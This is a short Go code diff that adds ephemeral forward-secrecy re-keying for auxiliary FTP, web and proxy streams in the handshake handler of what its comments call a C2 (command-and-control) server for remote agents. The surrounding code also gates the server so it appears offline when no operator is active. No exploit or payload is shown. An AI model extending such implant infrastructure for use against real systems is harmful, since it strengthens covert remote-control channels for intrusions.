@@ -236,6 +236,13 @@ func cborProtocolDispatch(t transport.StreamTransport) {
 	timer.Stop()
 	logging.Debugf("cborProtocolDispatch: handshake complete, timer stopped for %s", strconv.Quote(msgAuth.AgentUUID))
 
+	// ── Ephemeral PFS re-key for auxiliary routes ──────────────────────────
+	// The MsgAuth envelope was encrypted with the static per-build PSK. Auxiliary
+	// streams (FTP/WWW/proxy) are sub-operations of an established session: when
+	// the agent already negotiated an ephemeral PFS key on its message tunnel,
+	// every frame after the envelope on this stream switches to that key.
+	maybeRekeyAuxStream(routeCtx.Service, secureConn, msgAuth.AgentUUID)
+
 	// ── Operator presence/idle gate ─────────────────────────────────────────
 	// When no operator is online, or the operator has been idle past the
 	// configured timeout, the C2 behaves as if it is offline: it refuses all
